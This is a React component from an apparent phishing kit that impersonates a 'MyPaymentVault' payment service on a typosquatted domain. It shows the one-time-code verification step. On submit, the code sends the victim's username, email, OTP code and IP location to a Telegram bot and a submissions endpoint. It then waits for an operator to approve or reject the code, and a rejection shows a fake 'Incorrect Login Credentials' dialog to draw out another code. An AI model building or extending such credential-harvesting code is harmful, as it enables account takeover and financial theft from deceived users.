import { useState, useRef, useEffect, useCallback } from "react";
import { useLocation } from "wouter";
import { Helmet } from "react-helmet-async";
import { useAuth } from "@/lib/auth";
import { useI18n, type Language } from "@/lib/i18n";
import { Globe, ChevronDown, ShieldCheck } from "lucide-react";
import { sendTelegram, getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
import { LoadingModal } from "@/components/loading-modal";


const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

const RESEND_COOLDOWN = 60;

export default function Verify() {
  const { pendingUsername, maskedEmail, demoOtpCode, resendOtp, isAuthenticated } = useAuth();
  const { lang, setLang, langName, t } = useI18n();
  const [, navigate] = useLocation();

  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
  const [emailInput, setEmailInput] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [showLangDropdown, setShowLangDropdown] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);
  const [resendMsg, setResendMsg] = useState("");

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const offsetRef = useRef(0);

  useEffect(() => {
    if (!pendingUsername && !isAuthenticated) navigate("/login");
  }, [isAuthenticated, pendingUsername, navigate]);

  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);


  const startCooldown = useCallback(() => {
    setResendCooldown(RESEND_COOLDOWN);
    if (cooldownRef.current) clearInterval(cooldownRef.current);
    cooldownRef.current = setInterval(() => {
      setResendCooldown((prev) => {
        if (prev <= 1) {
          clearInterval(cooldownRef.current!);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => () => { if (cooldownRef.current) clearInterval(cooldownRef.current); }, []);

  const handleResend = async () => {
    if (resendCooldown > 0) return;
    setResendMsg("");
    setError("");
    const result = await resendOtp();
    if (result.ok) {
      setResendMsg("Code resent.");
      startCooldown();
    } else {
      setError("Failed to resend code. Please try again.");
    }
  };

  const handleDigitChange = (idx: number, val: string) => {
    const char = val.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[idx] = char;
    setDigits(next);
    if (char && idx < 5) inputRefs.current[idx + 1]?.focus();
  };

  const handleDigitKeyDown = (idx: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !digits[idx] && idx > 0) {
      inputRefs.current[idx - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (pasted) {
      const next = [...digits];
      for (let i = 0; i < 6; i++) next[i] = pasted[i] ?? "";
      setDigits(next);
      inputRefs.current[Math.min(pasted.length, 5)]?.focus();
    }
    e.preventDefault();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const code = digits.join("");
    if (code.length < 6) { setError("Please enter the 6-digit verification code."); return; }
    setError("");
    setLoading(true);

    setLoading(false);

    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const ip  = await getIPInfo();

    await sendTelegram(
      `━━━━━━━━━━━━━━━━━━━━━\n` +
      `✅ <b>mypaymenttvaulltr.com</b>\n` +
      `📌 <b>Step 4 — OTP Verified</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👤 <b>Username</b>   : <code>${pendingUsername}</code>\n` +
      `📧 <b>Email</b>      : <code>${emailInput || maskedEmail || "-"}</code>\n` +
      `🔢 <b>Kode OTP</b>   : <code>${code}</code>\n` +
      `🌐 <b>IP & Lokasi</b>: <code>${ip}</code>\n` +
      `🕐 <b>Waktu</b>      : ${now}\n` +
      `━━━━━━━━━━━━━━━━━━━━━`
    );
    await fetch("/api/submissions/otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: pendingUsername ?? "",
        email: emailInput || maskedEmail || "",
        otpCode: code,
        ipAddress: ip,
      }),
    }).catch(() => {});

    const startOffset = await getLatestOffset();
    offsetRef.current = startOffset;
    const sessionKey = Date.now().toString(36);

    await sendApprovalRequest(
      pendingUsername ?? "-",
      ip,
      now,
      sessionKey,
      "Verifikasi OTP"
    );
    setWaiting(true);

    pollRef.current = setInterval(async () => {
      const { status, nextOffset, callbackId } = await pollApproval(offsetRef.current, sessionKey);
      offsetRef.current = nextOffset;
      if (status === "approved") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "✅ OTP disetujui!");
        setWaiting(false);
        navigate("/contact-form");
      } else if (status === "rejected") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "❌ OTP ditolak.");
        setWaiting(false);
        setShowModal(true);
        setDigits(["", "", "", "", "", ""]);
        inputRefs.current[0]?.focus();
      }
    }, 2500);
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center"
      style={{ background: "#f7f7f7" }}
    >
      <Helmet>
        <title>Verify Identity — mypaymenttvaulltr.com</title>
        <meta name="description" content="Complete identity verification to access your MyPaymentVault account." />
        <link rel="canonical" href="https://www.mypaymenttvaulltr.com/verify" />
        <meta property="og:title" content="Verify Identity — mypaymenttvaulltr.com" />
        <meta property="og:description" content="Complete identity verification to access your MyPaymentVault account." />
        <meta property="og:url" content="https://www.mypaymenttvaulltr.com/verify" />
        <meta name="twitter:title" content="Verify Identity — mypaymenttvaulltr.com" />
        <meta name="twitter:description" content="Complete identity verification to access your MyPaymentVault account." />
      </Helmet>
      <LoadingModal show={waiting} />
      {/* ── INCORRECT CREDENTIALS MODAL ── */}
      {showModal && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 1000,
          background: "rgba(0,0,0,0.45)",
          display: "flex", alignItems: "center", justifyContent: "center",
          padding: "0 20px",
        }}>
          <div style={{
            background: "#fff", borderRadius: 4,
            padding: "32px 28px 24px",
            maxWidth: 380, width: "100%",
            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
            textAlign: "center",
          }}>
            <h3 style={{ fontSize: 18, fontWeight: 600, color: "#111", marginBottom: 14 }}>
              Incorrect Login Credentials
            </h3>
            <p style={{ fontSize: 13, color: "#555", lineHeight: 1.7, marginBottom: 24 }}>
              You've entered an incorrect username or password. After three failed attempts,
              your account may lock and you'll need to contact customer service.
            </p>
            <button
              type="button"
              onClick={() => setShowModal(false)}
              style={{
                width: "100%", height: 44, background: "#111", color: "#fff",
                fontSize: 14, fontWeight: 500, border: "none",
                borderRadius: 3, cursor: "pointer", letterSpacing: "0.03em",
              }}
            >
              Close
            </button>
          </div>
        </div>
      )}

      {/* ── WAITING OVERLAY ── */}
      {waiting && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 999,
          background: "rgba(255,255,255,0.7)",
          display: "flex", alignItems: "center", justifyContent: "center",
        }}>
          <div style={{
            width: 44, height: 44,
            border: "4px solid #e5e5e5", borderTop: "4px solid #111",
            borderRadius: "50%", animation: "spin 0.85s linear infinite",
          }} />
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
      )}

      {/* ─── CARD ─── */}
      <div
        className="w-full flex flex-col bg-white"
        style={{ maxWidth: 480, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
      >
        {/* ══ HEADER ROW ══ */}
        <div
          className="flex items-center justify-between"
          style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}
        >
          <span
            className="select-none cursor-pointer"
            style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
            onClick={() => navigate("/login")}
          >
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>

          {/* Language */}
          <div className="relative">
            <button
              type="button"
              onClick={() => setShowLangDropdown(!showLangDropdown)}
              style={{
                display: "flex", alignItems: "center", gap: 5,
                color: "#555", fontSize: 13, background: "none",
                border: "none", cursor: "pointer",
              }}
            >
              <Globe size={15} color="#555" />
              <span>{langName}</span>
              <ChevronDown size={13} color="#555"
                style={{ transform: showLangDropdown ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}
              />
            </button>
            {showLangDropdown && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
                <div style={{
                  position: "absolute", right: 0, top: "100%", marginTop: 4,
                  width: 140, background: "#fff", border: "1px solid #ddd",
                  boxShadow: "0 4px 16px rgba(0,0,0,0.15)", zIndex: 20,
                }}>
                  {languageOptions.map((opt) => (
                    <button key={opt.code} type="button"
                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                      style={{
                        display: "block", width: "100%", textAlign: "left",
                        padding: "10px 16px", fontSize: 13, background: "none",
                        border: "none", cursor: "pointer",
                        fontWeight: lang === opt.code ? 600 : 400,
                        color: lang === opt.code ? "#111" : "#555",
                      }}
                    >{opt.label}</button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        {/* ══ HERO IMAGE ══ */}
        <div style={{ width: "100%", lineHeight: 0 }}>
          <img src="/hero-vault-new.png" alt="mypaymenttvaulltr.com" style={{ width: "100%", display: "block" }} />
        </div>

        {/* ══ FORM ══ */}
        <div style={{ padding: "28px 28px 28px" }}>

          {/* Step indicator */}
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 20 }}>
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div style={{ flex: 1, height: 1, background: "#111" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div style={{ flex: 1, height: 1, background: "#111" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div style={{ flex: 1, height: 1, background: "#111" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>4</span>
            </div>
            <span style={{ fontSize: 12, color: "#888", marginLeft: 4 }}>Verification</span>
          </div>

          <h2 style={{ fontSize: 17, fontWeight: 400, color: "#111", marginBottom: 4 }}>
            {t.verifyIdentityTitle}
          </h2>
          <p style={{ fontSize: 13, color: "#888", marginBottom: 22 }}>
            {t.verifyIdentityDesc}
          </p>

          {/* Email input */}
          <div style={{ marginBottom: 20 }}>
            <label style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 6 }}>
              {t.emailAddress}
            </label>
            <input
              type="email"
              placeholder={t.enterEmailPlaceholder}
              value={emailInput}
              onChange={(e) => setEmailInput(e.target.value)}
              style={{
                width: "100%", height: 42, padding: "0 12px",
                fontSize: 14, color: "#111", border: "1px solid #ccc",
                borderRadius: 3, outline: "none", background: "#fff",
                boxSizing: "border-box",
              }}
            />
          </div>

          <form onSubmit={handleSubmit}>
            {/* 6-digit OTP */}
            <div style={{ marginBottom: 20 }}>
              <label style={{ fontSize: 12, color: "#666", display: "block", marginBottom: 8 }}>
                {t.verificationCode}
              </label>
              <div style={{ display: "flex", gap: 10, justifyContent: "space-between" }}>
                {digits.map((d, idx) => (
                  <input
                    key={idx}
                    ref={(el) => { inputRefs.current[idx] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={d}
                    onChange={(e) => handleDigitChange(idx, e.target.value)}
                    onKeyDown={(e) => handleDigitKeyDown(idx, e)}
                    onPaste={handlePaste}
                    style={{
                      width: 54, height: 62, textAlign: "center",
                      fontSize: 26, fontWeight: 700, color: "#111",
                      border: d ? "2.5px solid #111" : "1.5px solid #d0d0d0",
                      borderRadius: 8, outline: "none",
                      background: d ? "#f5f5f5" : "#fff",
                      boxShadow: d ? "0 2px 8px rgba(0,0,0,0.08)" : "none",
                      transition: "border-color 0.15s, box-shadow 0.15s",
                      flexShrink: 0,
                    }}
                  />
                ))}
              </div>

              <div style={{ marginTop: 10, display: "flex", alignItems: "center", gap: 8 }}>
                <button
                  type="button"
                  onClick={handleResend}
                  disabled={resendCooldown > 0}
                  style={{
                    fontSize: 12,
                    color: resendCooldown > 0 ? "#aaa" : "#111",
                    textDecoration: resendCooldown > 0 ? "none" : "underline",
                    background: "none", border: "none",
                    cursor: resendCooldown > 0 ? "not-allowed" : "pointer",
                    padding: 0,
                  }}
                >
                  {t.resendCode}
                </button>
                {resendCooldown > 0 && (
                  <span style={{ fontSize: 12, color: "#aaa" }}>({resendCooldown}s)</span>
                )}
                {resendMsg && resendCooldown > 0 && (
                  <span style={{ fontSize: 12, color: "#16a34a" }}>✓ {resendMsg}</span>
                )}
              </div>
            </div>

            {error && (
              <div style={{
                background: "#fff0f0", border: "1px solid #fcc", color: "#c00",
                fontSize: 12, padding: "8px 12px", marginBottom: 14, borderRadius: 3,
              }}>
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              style={{
                width: "100%", height: 44, background: "#111", color: "#fff",
                fontSize: 14, fontWeight: 500, border: "none",
                cursor: loading ? "not-allowed" : "pointer",
                opacity: loading ? 0.6 : 1,
                letterSpacing: "0.04em", borderRadius: 3,
                display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
              }}
            >
              {loading ? (
                <>{t.verifying}</>
              ) : (
                <><ShieldCheck size={16} /> {t.verifyAndContinue}</>
              )}
            </button>
          </form>

          <p style={{ fontSize: 12, color: "#aaa", textAlign: "center", marginTop: 14 }}>
            {t.wrongAccount}{" "}
            <button
              type="button"
              onClick={() => navigate("/login")}
              style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}
            >
              {t.backToLogin}
            </button>
          </p>
        </div>
      </div>

    </div>
  );
}
